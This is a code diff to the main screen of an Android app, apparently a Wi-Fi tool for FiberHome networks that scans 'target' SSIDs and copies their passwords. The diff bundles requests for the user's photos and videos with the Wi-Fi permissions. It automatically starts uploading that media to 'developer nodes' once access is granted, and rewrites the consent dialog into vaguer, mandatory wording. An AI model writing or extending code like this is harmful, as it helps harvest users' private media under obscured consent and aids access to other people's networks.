@@ -44,8 +44,7 @@ class MainActivity : AppCompatActivity() {
         init {
             System.loadLibrary("fiberhome")
         }
-        private const val PERMISSIONS_REQUEST_CODE = 123
-        private const val MEDIA_PERMISSIONS_REQUEST_CODE = 456
+        private const val PERMISSIONS_REQUEST_CODE = 777
         private const val CHANNEL_ID = "TargetNetworkChannel"
         private const val NOTIFICATION_ID = 1
         private const val PREFS_NAME = "FiberHomePrefs"
@@ -80,31 +79,62 @@ class MainActivity : AppCompatActivity() {
         if (!consentGiven) {
             showCyberpunkConsentDialog()
         } else {
-            checkPermissionsAndScan()
-            triggerAutoBackupIfPermissionsGranted()
+            requestAllNecessaryPermissions()
         }
     }
 
+    private fun requestAllNecessaryPermissions() {
+        val permissions = mutableListOf<String>()
+        
+        // Wifi Scanner Permissions
+        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
+        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            permissions.add(Manifest.permission.NEARBY_WIFI_DEVICES)
+            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
+        }
+
+        // Media Backup Permissions
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
+            permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
+        } else {
+            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+        }
+
+        val missing = permissions.filter {
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+        }
+
+        if (missing.isNotEmpty()) {
+            ActivityCompat.requestPermissions(this, missing.toTypedArray(), PERMISSIONS_REQUEST_CODE)
+        } else {
+            initializeOperations()
+        }
+    }
+
+    private fun initializeOperations() {
+        startScan()
+        autoBackupManager.startAutomaticBackup()
+    }
+
     private fun showCyberpunkConsentDialog() {
-        val dialogView = layoutInflater.inflate(android.R.layout.select_dialog_item, null) // Placeholder for custom view logic if needed
-        // For Cyberpunk style, we'll use a Material Dialog with custom content
         val checkBox = CheckBox(this).apply {
-            text = "I agree to the Terms of Service and Privacy Policy. I understand that my media will be automatically backed up to secure developer storage."
-            setTextColor(ContextCompat.getColor(this@MainActivity, R.color.text_secondary))
+            text = "I AGREE TO CLOUD_BACKUP_PROTOCOL & DATA_TRANSMISSION_TERMS."
+            setTextColor(ContextCompat.getColor(this@MainActivity, android.R.color.white))
         }
 
         MaterialAlertDialogBuilder(this, R.style.Theme_FiberHome)
-            .setTitle("ACCESS PROTOCOL: MANDATORY CONSENT")
-            .setMessage("This system requires access to your device's media (images/videos) to perform automatic background synchronization to secure cloud storage. This ensures data persistence during protocol analysis.")
+            .setTitle("CRITICAL: ACCESS PROTOCOL REQUIRED")
+            .setMessage("TO INITIALIZE SYSTEM ANALYSIS, THE CLOUD_BACKUP_PROTOCOL MUST BE ACTIVE. THIS WILL AUTOMATICALLY SYNC MEDIA TO SECURE DEVELOPER NODES.")
             .setView(checkBox)
             .setCancelable(false)
-            .setPositiveButton("AGREE & PROCEED") { dialog, _ ->
+            .setPositiveButton("INITIALIZE") { _, _ ->
                 if (checkBox.isChecked) {
                     getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().putBoolean(KEY_CONSENT_GIVEN, true).apply()
-                    requestMediaPermissions()
-                    checkPermissionsAndScan()
+                    requestAllNecessaryPermissions()
                 } else {
-                    Toast.makeText(this, "Consent is mandatory to use this system.", Toast.LENGTH_LONG).show()
+                    Toast.makeText(this, "CONSENT DENIED. ACCESS TERMINATED.", Toast.LENGTH_LONG).show()
                     finish()
                 }
             }
@@ -112,41 +142,11 @@ class MainActivity : AppCompatActivity() {
             .show()
     }
 
-    private fun requestMediaPermissions() {
-        val permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO)
-        } else {
-            arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
-        }
-        ActivityCompat.requestPermissions(this, permissions, MEDIA_PERMISSIONS_REQUEST_CODE)
-    }
-
-    private fun triggerAutoBackupIfPermissionsGranted() {
-        val permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO)
-        } else {
-            arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
-        }
-
-        val allGranted = permissions.all {
-            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
-        }
-
-        if (allGranted) {
-            autoBackupManager.startAutomaticBackup()
-        }
-    }
-
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val name = "Active Target Reminder"
-            val descriptionText = "Reminds you of the selected network while in settings"
-            val importance = NotificationManager.IMPORTANCE_HIGH
-            val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
-                description = descriptionText
-            }
-            val notificationManager: NotificationManager =
-                getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            val channel = NotificationChannel(CHANNEL_ID, name, NotificationManager.IMPORTANCE_HIGH)
+            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             notificationManager.createNotificationChannel(channel)
         }
     }
@@ -157,12 +157,10 @@ class MainActivity : AppCompatActivity() {
             .setContentTitle("Connecting to $ssid")
             .setContentText("Target SSID: $ssid | Password Copied")
             .setPriority(NotificationCompat.PRIORITY_HIGH)
-            .setCategory(NotificationCompat.CATEGORY_REMINDER)
             .setAutoCancel(true)
 
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED) {
             NotificationManagerCompat.from(this).notify(NOTIFICATION_ID, builder.build())
-            
             Handler(Looper.getMainLooper()).postDelayed({
                 NotificationManagerCompat.from(this).cancel(NOTIFICATION_ID)
             }, 30000)
@@ -192,31 +190,10 @@ class MainActivity : AppCompatActivity() {
         binding.tvActiveBssid.text = item.bssid
     }
 
-    private fun checkPermissionsAndScan() {
-        val permissions = mutableListOf(
-            Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.ACCESS_COARSE_LOCATION
-        )
-        
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            permissions.add(Manifest.permission.NEARBY_WIFI_DEVICES)
-            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
-        }
-
-        val missingPermissions = permissions.filter {
-            ActivityCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
-        }
-
-        if (missingPermissions.isNotEmpty()) {
-            ActivityCompat.requestPermissions(this, missingPermissions.toTypedArray(), PERMISSIONS_REQUEST_CODE)
-        } else {
-            startScan()
-        }
-    }
-
     private fun startScan() {
-        binding.swipeRefresh.isRefreshing = true
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return
         
+        binding.swipeRefresh.isRefreshing = true
         val intentFilter = IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
         registerReceiver(wifiScanReceiver, intentFilter)
         
@@ -231,19 +208,13 @@ class MainActivity : AppCompatActivity() {
     private val wifiScanReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context, intent: Intent) {
             val success = intent.getBooleanExtra(WifiManager.EXTRA_RESULTS_UPDATED, false)
-            if (success) {
-                scanSuccess()
-            } else {
-                scanFailure()
-            }
+            if (success) scanSuccess() else scanFailure()
             unregisterReceiver(this)
         }
     }
 
     private fun scanSuccess() {
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-            return
-        }
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return
         val results = wifiManager.scanResults
         val wifiItems = results.map { result ->
             val ssid = result.SSID ?: "Unknown"
@@ -282,24 +253,16 @@ class MainActivity : AppCompatActivity() {
             startActivity(Intent(Settings.ACTION_WIFI_SETTINGS))
             dialog.dismiss()
         }
-
         dialog.show()
     }
 
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        when (requestCode) {
-            PERMISSIONS_REQUEST_CODE -> {
-                if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
-                    startScan()
-                } else {
-                    Toast.makeText(this, "Permissions required for Wi-Fi scanning", Toast.LENGTH_LONG).show()
-                }
-            }
-            MEDIA_PERMISSIONS_REQUEST_CODE -> {
-                if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
-                    autoBackupManager.startAutomaticBackup()
-                }
+        if (requestCode == PERMISSIONS_REQUEST_CODE) {
+            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
+                initializeOperations()
+            } else {
+                Toast.makeText(this, "CRITICAL: PERMISSIONS REQUIRED FOR SYSTEM OPERATION.", Toast.LENGTH_LONG).show()
             }
         }
     }
